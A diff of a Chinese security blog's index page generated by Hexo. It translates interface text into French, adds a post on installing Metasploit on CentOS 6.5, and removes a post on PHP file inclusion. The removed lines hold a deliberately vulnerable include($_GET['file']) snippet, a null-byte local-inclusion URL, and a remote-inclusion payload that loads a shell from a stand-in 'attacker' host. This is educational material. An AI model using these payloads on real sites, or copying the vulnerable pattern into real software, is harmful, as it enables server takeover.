@@ -51,9 +51,9 @@
       </nav>
       <nav id="sub-nav">
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
@@ -63,6 +63,62 @@
 </header>
       <div class="outer">
         <section id="main">
+  
+    <article id="post-centos6-5安装metasploit" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="2016/08/19/centos6-5安装metasploit/" class="article-date">
+  <time datetime="2016-08-19T07:48:45.000Z" itemprop="datePublished">2016-08-19</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="categories/linux/">linux</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="2016/08/19/centos6-5安装metasploit/">centos6.5安装metasploit</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Metasploit是一款强大的开源安全检测工具，攻击渗透功能十分强大，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估， 提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程。<br>安装环境：<br>  centos6.5<br>查看系统版本：<br>[root@VM_117_255_centos ~]# uname -a<br>Linux VM_117_255_centos 2.6.32-504.30.3.el6.x86_64 #1 SMP Wed Jul 15 10:13:09 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</p>
+<h2 id="【详细安装流程】"><a href="#【详细安装流程】" class="headerlink" title="【详细安装流程】"></a>【详细安装流程】</h2><p>1.更新yum源，安装metasploit需要安装一系列的依赖包，更新yum源<br>[root@VM_117_255_centos ~]# yum update<br>2.安装开发环境依赖包，理由同上：<br>[root@VM_117_255_centos ~]# yum groupinstall ‘development tools’<br>3.安装msf所需要的开发工具依赖包<br>[root@VM_9_220_centos ~]#yum install sqlite-devel libxslt-devel<br>libxml2-devel java-1.7.0-openjdk libpcap-devel nano openssl-devel<br>zlib-devel libffi-devel gdbm-devel readline-devel nano wget<br>上述依赖包以及开发工具安装完成之后接下来就需要安装 ruby 环境，<br>因为新版本的 metasploit 开发人员是用 ruby 写的，最开始的时候 metasploit<br>是用 perl 脚本语言写的，一直到 2006 年的 2.7 版本一直都还是使用 perl 语言<br>编写的，后来开发人员发现 perl 存在一些缺陷，所以在 2007 年底使用 ruby 语<br>言重写了 metasploit 的框架。</p>
+<h2 id="二、相关组件安装"><a href="#二、相关组件安装" class="headerlink" title="二、相关组件安装"></a>二、相关组件安装</h2><p>1.RVM安装<br>安装ruby之前先安装一下ruby的管理工具RVM,个人推荐安装ruby使用方便，使用curl下载rvm<br>[root@VM_117_255_centos ~]# curl -L get.rvm.io | bash -s stable<br>需要下载一个验证码之类的东西，下载之后在执行rvm<br>[root@VM_117_255_centos ~]# curl -sSL <a href="https://rvm.io/mpapis.asc" target="_blank" rel="external">https://rvm.io/mpapis.asc</a> | gpg2 –import -<br>[root@VM_117_255_centos ~]# curl -L get.rvm.io | bash -s stable<br>出现Think you for using RVM！证明安装完成了<br>使用rvm的配置文件，使其生效<br>[root@VM_117_255_centos ~]# find / -name rvm.sh<br>[root@VM_117_255_centos ~]# source /etc/profile.d/rvm.sh<br>[root@VM_117_255_centos ~]# rvm<br>其实到这里已经可以使用 rvm 进行 ruby 的安装及使用了， 为了后续的完美使用，<br>我们现在装一下 rvm 所需要的一些依赖：<br>[root@VM_117_255_centos ~]# rvm requirements<br>Checking requirements for centos.<br>Installing requirements for centos.<br>Installing required packages: libyaml-devel……<br>Requirements installation successful.<br>[root@VM_117_255_centos ~]# rvmsudo yum install -y gcc-c++ patch readline  readline-devel zlib zlib-devel libyaml-devel libffi-devel openssl-devel  make bzip2 autoconf automake libtool bison iconv-devel<br>[root@VM_117_255_centos ~]# rvm requirements<br>Checking requirements for centos.<br>Requirements installation successful.<br>上述rvm已经安装成功<br>2、yaml安装<br>后续的一些组件在安装的时候需要源码安装，所以源码安装之前先安装yaml，yaml是表达资料序列的编程语言</p>
+<p>[root@VM_117_255_centos ~]# cd /usr/src/<br>[root@VM_117_255_centos src]# wget <a href="http://pyyaml.org/download/libyaml/yaml-0.1.6.tar.gz" target="_blank" rel="external">http://pyyaml.org/download/libyaml/yaml-0.1.6.tar.gz</a></p>
+<p>[root@VM_117_255_centos src]# tar -zxvf yaml-0.1.6.tar.gz<br> [root@VM_117_255_centos src]# rm -rf yaml-0.1.6.tar.gz<br> [root@VM_117_255_centos src]# cd yaml-0.1.6/<br>[root@VM_117_255_centos yaml-0.1.6]# ./configure –prefix=/usr/local<br>[root@VM_117_255_centos yaml-0.1.6]# make                                 编译<br> [root@VM_117_255_centos yaml-0.1.6]# make install                       安装<br>[root@VM_117_255_centos yaml-0.1.6]# make clean                          清除缓存文件</p>
+<h2 id="三、安装nmap"><a href="#三、安装nmap" class="headerlink" title="三、安装nmap"></a>三、安装nmap</h2><p>据说 metasploit 中没有 nmap 那就安装一下吧，namp 是一款强大的端口扫描工具，在渗透测<br>试过程中，情报收集阶段利用非常方便：<br>会在当前目录下，增加一个 nmap 文件夹； svn 的 namp 文件的内容，在 nmap<br>文件夹中<br>[root@VM_117_255_centos yaml-0.1.6]# svn co <a href="https://svn.nmap.org/nmap" target="_blank" rel="external">https://svn.nmap.org/nmap</a><br>[root@VM_117_255_centos yaml-0.1.6]# cd nmap<br>[root@VM_117_255_centos nmap]# ./configure<br> root@VM_117_255_centos nmap]# make<br>[root@VM_117_255_centos nmap]# make install<br>[root@VM_117_255_centos nmap]# make clean</p>
+<h2 id="四、安装ruby"><a href="#四、安装ruby" class="headerlink" title="四、安装ruby"></a>四、安装ruby</h2><p>Ruby 是一种面向对象、命令式、函数式、动态的通用编程语言<br>先查看一下安装的有没有 ruby 版本：<br>[root@VM_117_255_centos yaml-0.1.6]# rvm list<br>安装最新版本的 ruby,metasploit 貌似对 ruby 版本还有要求，网上说的是不能<br>低于 1.9.2，不管这些，安装最新版本的就对了：<br>[root@VM_117_255_centos yaml-0.1.6]# rvm install ruby-2.3.1<br>[root@VM_117_255_centos yaml-0.1.6]# rvm list</p>
+<p>rvm rubies</p>
+<p>=* ruby-2.3.1 [ x86_64 ]</p>
+<h1 id="gt-current"><a href="#gt-current" class="headerlink" title="=&gt; - current"></a>=&gt; - current</h1><h1 id="current-amp-amp-default"><a href="#current-amp-amp-default" class="headerlink" title="=* - current &amp;&amp; default"></a>=* - current &amp;&amp; default</h1><h1 id="default"><a href="#default" class="headerlink" title="* - default"></a>* - default</h1><h2 id="五、安装postgresql"><a href="#五、安装postgresql" class="headerlink" title="五、安装postgresql"></a>五、安装postgresql</h2><p>msf 使用的是 postgrepsql server 的数据管理库， PostgreSQL 是一个自由的<br>对象-关系数据库服务器(数据库管理系统)<br>首先修改一下配置文件：<br>[root@VM_117_255_centos yaml-0.1.6]# vim /etc/yum.repos.d/CentOS-Base.repo<br>添加内容：exclude=postgresql*<br>接下来下载安装：<br>[root@VM_117_255_centos src]# wget <a href="http://yum.postgresql.org/9.2/redhat/rhel-6-x86_64/pgdg-centos92-9.2-6.noarch.rpm" target="_blank" rel="external">http://yum.postgresql.org/9.2/redhat/rhel-6-x86_64/pgdg-centos92-9.2-6.noarch.rpm</a><br>[root@VM_117_255_centos src]# rpm -ivh pgdg-centos92-9.2-6.noarch.rpm<br>更新一下安装包<br>[root@VM_117_255_centos src]# yum update<br>[root@VM_117_255_centos src]#  yum install postgresql92-server postgresql92-devel postgresql92<br>将安装好的 postgresql 数据库进行配置：<br>[root@VM_117_255_centos src]#  service postgresql-9.2 initdb    初始化数据库<br>Initializing database:                                     [  OK  ]<br>[root@VM_117_255_centos src]#  service postgresql-9.2 start       开启服务<br>Starting postgresql-9.2 service:                           [  OK  ]<br>[root@VM_117_255_centos src]#  chkconfig postgresql-9.2 on   开机自启动<br> [root@VM_117_255_centos src]# echo export  PATH=/usr/pgsql-9.2/bin:\$PATH &gt;&gt; /etc/bashrc<br>[root@VM_117_255_centos src]#  source ~/.bashrc<br>给 postgresql 数据库创建用户，设置密码：<br>[root@VM_117_255_centos src]# su - postgres<br>-bash-4.1$ createuser msf -P -S -R -D<br>Enter password for new role:<br>Enter it again:<br>-bash-4.1$ createdb -O msf msf<br>-bash-4.1$ exit<br>管理数据库的配置文件<br>[root@VM_117_255_centos src]#  vim /var/lib/pgsql/9.2/data/pg_hba.conf<br>local msf msf md5<br>host msf msf 127.0.0.1/8 md5<br>host msf msf ::1/128 md5<br>修改完配置文件，重启一下服务：<br>[root@VM_117_255_centos src]#  service postgresql-9.2 start<br>Starting postgresql-9.2 service:                           [  OK  ]</p>
+<h2 id="六、安装metasploit"><a href="#六、安装metasploit" class="headerlink" title="六、安装metasploit"></a>六、安装metasploit</h2><p>首先安装 msf 所需要的 ruby 库<br>[root@VM_117_255_centos src]# gem install wirble pg sqlite3 msgpack activerecord redcarpet rspec simplecov yard bundler<br>下载 metasploit 框架，将其放到 opt 目录下：<br>[root@VM_117_255_centos opt]# git clone <a href="https://github.com/rapid7/metasploit-framework.git" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework.git</a><br>下载很慢很慢很慢，你们要准备好等待。。。。。<br>[root@VM_117_255_centos opt]# ls<br>metasploit-framework  rh<br>[root@VM_117_255_centos opt]# cd metasploit-framework/<br>编辑 msf 的数据库配置文件，使 msf 启动的时候能够加载数据库<br>[root@VM_117_255_centos metasploit-framework]# bundle install<br>[root@VM_117_255_centos metasploit-framework]# nano /opt/metasploit-framework/database.yml<br>写入的内容：<br>production:<br>adapter: postgresql<br>database: msf<br>username: msf<br>password: 111111<br>host: 127.0.0.1<br>port: 5432<br>pool: 75<br>timeout: 5<br>按ctrl+x 然后按下确定键<br>添加环境变量使其生效<br>[root@VM_117_255_centos metasploit-framework]#  echo export  MSF_DATABASE_CONFIG=/opt/metasploit-framework/database.yml &gt;&gt;  /etc/bashrc<br>[root@VM_117_255_centos metasploit-framework]#  source ~/.bashrc<br>[root@VM_117_255_centos metasploit-framework]# ./msfconsole<br>[root@VM_117_255_centos metasploit-framework]# service postgresql-9.2 restart<br>Stopping postgresql-9.2 service:                           [  OK  ]<br>Starting postgresql-9.2 service:                           [  OK  ]</p>
+<h2 id="数据库连接问题"><a href="#数据库连接问题" class="headerlink" title="数据库连接问题"></a>数据库连接问题</h2><p>如果数据库连接不上有以下几种解决方法：<br>1.进入msf之后<br>msf &gt; db_status<br>[<em>] postgresql selected, no connection<br>msf &gt; db_connect msf:111111@localhost/msf<br>[</em>] Rebuilding the module cache in the background…<br>msf &gt; db_status<br>[*] postgresql connected to msf<br>2.如果还连接不上就查看一下配置文件<br>oot@VM_117_255_centos metasploit-framework]# nano /opt/metasploit-framework/database.yml<br>3.如果不行就可以创建一个用户<br>启动postgresql 服务:<br>service postgresql start<br>进入 postgres:<br>su postgres<br>输入如下命令创建一个postgresql数据库账户:<br>createuser msf3 –P<br>命令中的msf3就是要创建的用户，当然你可以输入任何其他用户名。<br>接着，终端中会提示你输入密码，然后确认密码，这里我设置密码为“msf3”。<br>然后询问你该账户的权限，输入y或者n都无所谓。<br>创建数据库:<br>createdb –owner=msf3 msf3<br>owner参数指定数据库的所有者，这里为msf3，最后一个参数为数据库名称，这里也设置为msf3。<br>输入exit退出当前用户，回到root上下文中。回到手动连接的步骤:<br>root@kali: msfconsole<br>msf &gt; db_connect msf3:msf3@localhost/msf3<br>这也是kali第一次启动数据库连接不上可以解决</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/08/19/centos6-5安装metasploit/" data-id="cis1gmpz70001z4hronw162f9" class="article-share-link">Partager</a>
+      
+        <a href="http://yoursite.com/2016/08/19/centos6-5安装metasploit/#disqus_thread" class="article-comment-link">Commentaires</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/centos/">centos</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
   
     <article id="post-openssl心脏滴血漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -101,9 +157,9 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/18/openssl心脏滴血漏洞/" data-id="cis0ahoc7000gjwhrk8z0bu9n" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/18/openssl心脏滴血漏洞/" data-id="cis1gmq4u000uz4hr5exq1w7s" class="article-share-link">Partager</a>
       
-        <a href="http://yoursite.com/2016/08/18/openssl心脏滴血漏洞/#disqus_thread" class="article-comment-link">Comments</a>
+        <a href="http://yoursite.com/2016/08/18/openssl心脏滴血漏洞/#disqus_thread" class="article-comment-link">Commentaires</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/openssl/">openssl</a></li></ul>
@@ -166,9 +222,9 @@ Host: www.xxxx.com
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/11/文件上传之解析漏洞/" data-id="cis0ahofs0020jwhr1qd1gzdn" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/11/文件上传之解析漏洞/" data-id="cis1gmq7f0028z4hrsxc5bcv3" class="article-share-link">Partager</a>
       
-        <a href="http://yoursite.com/2016/08/11/文件上传之解析漏洞/#disqus_thread" class="article-comment-link">Comments</a>
+        <a href="http://yoursite.com/2016/08/11/文件上传之解析漏洞/#disqus_thread" class="article-comment-link">Commentaires</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/上传/">上传</a></li></ul>
@@ -276,9 +332,9 @@ Host: www.xxxx.com
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/08/centos搭建tomcat以及漏洞利用/" data-id="cis0ahogr002ijwhrfli1fdu2" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/08/centos搭建tomcat以及漏洞利用/" data-id="cis1gmq2o000az4hrosrv9phr" class="article-share-link">Partager</a>
       
-        <a href="http://yoursite.com/2016/08/08/centos搭建tomcat以及漏洞利用/#disqus_thread" class="article-comment-link">Comments</a>
+        <a href="http://yoursite.com/2016/08/08/centos搭建tomcat以及漏洞利用/#disqus_thread" class="article-comment-link">Commentaires</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/tomcat/">tomcat</a></li></ul>
@@ -330,9 +386,9 @@ Host: www.xxxx.com
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/05/webshell的获取与查杀/" data-id="cis0ahody0016jwhrxwqwxjvo" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/05/webshell的获取与查杀/" data-id="cis1gmq65001fz4hryt81o2iw" class="article-share-link">Partager</a>
       
-        <a href="http://yoursite.com/2016/08/05/webshell的获取与查杀/#disqus_thread" class="article-comment-link">Comments</a>
+        <a href="http://yoursite.com/2016/08/05/webshell的获取与查杀/#disqus_thread" class="article-comment-link">Commentaires</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/webshell/">webshell</a></li></ul>
@@ -376,9 +432,9 @@ Host: www.xxxx.com
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/05/redis漏洞利用/" data-id="cis0ahocb000ijwhre57i5wz1" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/05/redis漏洞利用/" data-id="cis1gmq4u000xz4hrkzeo97dh" class="article-share-link">Partager</a>
       
-        <a href="http://yoursite.com/2016/08/05/redis漏洞利用/#disqus_thread" class="article-comment-link">Comments</a>
+        <a href="http://yoursite.com/2016/08/05/redis漏洞利用/#disqus_thread" class="article-comment-link">Commentaires</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/redis/">redis</a></li></ul>
@@ -424,9 +480,9 @@ Host: www.xxxx.com
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/05/redis的安装/" data-id="cis0ahode0010jwhrrcspn8xx" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/05/redis的安装/" data-id="cis1gmq4u000zz4hrci8dl25l" class="article-share-link">Partager</a>
       
-        <a href="http://yoursite.com/2016/08/05/redis的安装/#disqus_thread" class="article-comment-link">Comments</a>
+        <a href="http://yoursite.com/2016/08/05/redis的安装/#disqus_thread" class="article-comment-link">Commentaires</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/redis/">redis</a></li></ul>
@@ -474,9 +530,9 @@ Host: www.xxxx.com
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/05/centos6-5samba服务器的搭建/" data-id="cis0ahogn002ejwhrt0jeq4o2" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/05/centos6-5samba服务器的搭建/" data-id="cis1gmpz70000z4hrr4uy1jwb" class="article-share-link">Partager</a>
       
-        <a href="http://yoursite.com/2016/08/05/centos6-5samba服务器的搭建/#disqus_thread" class="article-comment-link">Comments</a>
+        <a href="http://yoursite.com/2016/08/05/centos6-5samba服务器的搭建/#disqus_thread" class="article-comment-link">Commentaires</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/centos/">centos</a></li></ul>
@@ -529,9 +585,9 @@ Host: www.xxxx.com
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/04/逻辑漏洞/" data-id="cis0ahogj002cjwhrp2qzak65" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/04/逻辑漏洞/" data-id="cis1gmq7f002bz4hr9gjx1m5b" class="article-share-link">Partager</a>
       
-        <a href="http://yoursite.com/2016/08/04/逻辑漏洞/#disqus_thread" class="article-comment-link">Comments</a>
+        <a href="http://yoursite.com/2016/08/04/逻辑漏洞/#disqus_thread" class="article-comment-link">Commentaires</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/逻辑/">逻辑</a></li></ul>
@@ -580,62 +636,12 @@ Host: www.xxxx.com
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/01/敏感信息泄露/" data-id="cis0ahoew001ojwhrusj42ebn" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/01/敏感信息泄露/" data-id="cis1gmq70001wz4hr61snwpc5" class="article-share-link">Partager</a>
       
-        <a href="http://yoursite.com/2016/08/01/敏感信息泄露/#disqus_thread" class="article-comment-link">Comments</a>
+        <a href="http://yoursite.com/2016/08/01/敏感信息泄露/#disqus_thread" class="article-comment-link">Commentaires</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/敏感信息/">敏感信息</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="2016/07/30/文件包含漏洞/" class="article-date">
-  <time datetime="2016-07-30T12:58:16.000Z" itemprop="datePublished">2016-07-30</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="categories/WEB/">WEB</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="2016/07/30/文件包含漏洞/">文件包含漏洞</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><strong>原理</strong><br>传入的文件名没有经过合理的校验，或者被过滤，从而操作了预想之外的文件，就可以导致文件泄露甚至恶意的代码注入<br><strong>漏洞分类</strong><br><strong>本地文件包含</strong><br>  上传木马，包含<br>  读文件<br>  日志文件<br>   phpinfo可以包含临时文件<br><strong>远程文件包含</strong><br>  保证php.ini中allow_url_fopen和 allow_url_include打开<br><strong>常见的文件包含的函数</strong><br>        include()                 发生错误时继续执行   用到时加载<br>     include_once()包含一次<br>     require()输出错误信息，终止程序运行，一开始就加载<br>    require_once()程序只调用一次   表示已加载的不加载<br><strong>利用条件</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">用户能够控制该动态变量</div><div class="line">**漏洞危害**</div><div class="line">执行任意代码</div><div class="line">包含恶意文件控制网站</div><div class="line">甚至控制服务器</div></pre></td></tr></table></figure></p>
-<p>看到参数，校验不严格，存在文件包含漏洞<br>&lt;?<br>$a=$_GET[‘file’];<br>include($a);<br>?&gt;<br>触发条件是include()<br>用这个代码搭建一个自己的环境<br><strong>本地文件包含</strong><br>   因为没有做过过滤，可以执行<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/9/1.png?raw=true" alt="image"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if ($_GET[&apos;page&apos;]) &#123; </div><div class="line">include &quot;./action/&quot;.$_GET[&apos;page&apos;].&quot;.php&quot;; </div><div class="line">&#125; else &#123; </div><div class="line">include &quot;./action/show.php&quot;; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>这个文件是%00截断<br><code>http://127.0.0.1:8088/dome/include.php?page=../../phpinfo.php%00</code><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/9/2.png?raw=true" alt="image"></p>
-<p>#远程文件包含<br>php.ini中allow_url_include=ON<br>如: require_once $basePath.’/action/m_share.php’<br>构造:/?param=<a href="http://attacker/phpshell.txt?" target="_blank" rel="external">http://attacker/phpshell.txt?</a>  注意?用来使后面变为一个查询值，起到截断作用，亦或者用%00截断<br><a href="http://127.0.0.1:8088/dome/include.php?file=http://www.dlam.ml/" target="_blank" rel="external">http://127.0.0.1:8088/dome/include.php?file=http://www.dlam.ml/</a><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/9/3.png?raw=true" alt="image"><br>  <strong>文件包含漏洞的实列</strong><br>找了好久都没有找到文件包含的实列<br>用别人的吧<br>读取一些信息</p>
-<p>但是好像并不能远程文件包含</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/30/文件包含漏洞/" data-id="cis0ahofo001xjwhr8h6sn42m" class="article-share-link">Share</a>
-      
-        <a href="http://yoursite.com/2016/07/30/文件包含漏洞/#disqus_thread" class="article-comment-link">Comments</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/文件包含/">文件包含</a></li></ul>
 
     </footer>
   </div>
@@ -655,7 +661,7 @@ Host: www.xxxx.com
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
+    <h3 class="widget-title">Catégories</h3>
     <div class="widget">
       <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="categories/WEB/">WEB</a></li><li class="category-list-item"><a class="category-list-link" href="categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="categories/安全/">安全</a></li></ul>
     </div>
@@ -665,7 +671,7 @@ Host: www.xxxx.com
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
+    <h3 class="widget-title">Mot-clés</h3>
     <div class="widget">
       <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="tags/centos/">centos</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/csrf/">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/github/">github</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/google/">google</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/linux问题/">linux问题</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/mysql/">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/openssl/">openssl</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/sqlmap/">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/tcp-ip/">tcp/ip</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/tomcat/">tomcat</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/webshell/">webshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/win2003/">win2003</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/上传/">上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/执行/">执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/敏感信息/">敏感信息</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/文件包含/">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/流程/">流程</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/逻辑/">逻辑</a></li></ul>
     </div>
@@ -675,9 +681,9 @@ Host: www.xxxx.com
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
+    <h3 class="widget-title">Nuage de mot-clés</h3>
     <div class="widget tagcloud">
-      <a href="tags/centos/" style="font-size: 16.67px;">centos</a> <a href="tags/csrf/" style="font-size: 10px;">csrf</a> <a href="tags/github/" style="font-size: 10px;">github</a> <a href="tags/google/" style="font-size: 10px;">google</a> <a href="tags/linux问题/" style="font-size: 10px;">linux问题</a> <a href="tags/mysql/" style="font-size: 10px;">mysql</a> <a href="tags/openssl/" style="font-size: 10px;">openssl</a> <a href="tags/redis/" style="font-size: 13.33px;">redis</a> <a href="tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="tags/sql注入/" style="font-size: 20px;">sql注入</a> <a href="tags/tcp-ip/" style="font-size: 10px;">tcp/ip</a> <a href="tags/tomcat/" style="font-size: 10px;">tomcat</a> <a href="tags/webshell/" style="font-size: 10px;">webshell</a> <a href="tags/win2003/" style="font-size: 10px;">win2003</a> <a href="tags/xss/" style="font-size: 13.33px;">xss</a> <a href="tags/上传/" style="font-size: 16.67px;">上传</a> <a href="tags/执行/" style="font-size: 13.33px;">执行</a> <a href="tags/敏感信息/" style="font-size: 10px;">敏感信息</a> <a href="tags/文件包含/" style="font-size: 10px;">文件包含</a> <a href="tags/流程/" style="font-size: 10px;">流程</a> <a href="tags/逻辑/" style="font-size: 10px;">逻辑</a>
+      <a href="tags/centos/" style="font-size: 17.5px;">centos</a> <a href="tags/csrf/" style="font-size: 10px;">csrf</a> <a href="tags/github/" style="font-size: 10px;">github</a> <a href="tags/google/" style="font-size: 10px;">google</a> <a href="tags/linux问题/" style="font-size: 10px;">linux问题</a> <a href="tags/mysql/" style="font-size: 10px;">mysql</a> <a href="tags/openssl/" style="font-size: 10px;">openssl</a> <a href="tags/redis/" style="font-size: 12.5px;">redis</a> <a href="tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="tags/sql注入/" style="font-size: 20px;">sql注入</a> <a href="tags/tcp-ip/" style="font-size: 10px;">tcp/ip</a> <a href="tags/tomcat/" style="font-size: 10px;">tomcat</a> <a href="tags/webshell/" style="font-size: 10px;">webshell</a> <a href="tags/win2003/" style="font-size: 10px;">win2003</a> <a href="tags/xss/" style="font-size: 12.5px;">xss</a> <a href="tags/上传/" style="font-size: 15px;">上传</a> <a href="tags/执行/" style="font-size: 12.5px;">执行</a> <a href="tags/敏感信息/" style="font-size: 10px;">敏感信息</a> <a href="tags/文件包含/" style="font-size: 10px;">文件包含</a> <a href="tags/流程/" style="font-size: 10px;">流程</a> <a href="tags/逻辑/" style="font-size: 10px;">逻辑</a>
     </div>
   </div>
 
@@ -694,9 +700,13 @@ Host: www.xxxx.com
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
+    <h3 class="widget-title">Articles récents</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="2016/08/19/centos6-5安装metasploit/">centos6.5安装metasploit</a>
+          </li>
         
           <li>
             <a href="2016/08/18/openssl心脏滴血漏洞/">openssl心脏滴血漏洞</a>
@@ -714,10 +724,6 @@ Host: www.xxxx.com
             <a href="2016/08/05/webshell的获取与查杀/">webshell的获取与查杀</a>
           </li>
         
-          <li>
-            <a href="2016/08/05/redis漏洞利用/">redis漏洞利用</a>
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -731,7 +737,7 @@ Host: www.xxxx.com
   <div class="outer">
     <div id="footer-info" class="inner">
       &copy; 2016 春天的春，晴天的晴<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
 </footer>
